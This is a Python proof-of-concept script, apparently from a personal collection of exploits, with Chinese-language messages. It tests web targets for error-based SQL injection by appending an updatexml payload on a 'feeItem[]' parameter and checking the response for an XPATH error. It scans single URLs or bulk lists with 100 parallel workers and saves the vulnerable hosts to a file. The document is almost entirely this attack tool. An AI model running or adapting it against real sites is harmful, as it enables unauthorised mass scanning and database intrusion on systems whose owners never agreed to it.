# My-POC-Collection
import argparse
import requests
from multiprocessing import Pool
from urllib.parse import quote

def poc(url):
    url = url.strip()
    if not url.startswith("http"):
        url = "http://" + url
    payload = "feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)"
    target = f"{url}{quote(payload)}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    try:
        response = requests.get(target, headers=headers, timeout=10)
        if response.status_code == 200 and "XPATH" in response.text:
            print(f"[+] {url} 存在漏洞")
            with open("result.txt", "a") as f:
                f.write(f"{url}\n")
        else:
            print(f"[-] {url} 不存在漏洞")
    except Exception as e:
        print(f"[!] 请求 {url} 时发生错误: {e}")
    return None
def main():
    parser = argparse.ArgumentParser(description="SQL注入漏洞检测脚本")
    parser.add_argument('-u', '--url', type=str, help='单个URL检测')
    parser.add_argument('-f', '--file', type=str, help='批量URL检测文件')
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    elif args.file:
        with open(args.file, 'r',encoding='utf-8') as f:
            url_list = []
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        print("请提供一个URL或一个包含URL的文件")

if __name__ == "__main__":
    main()
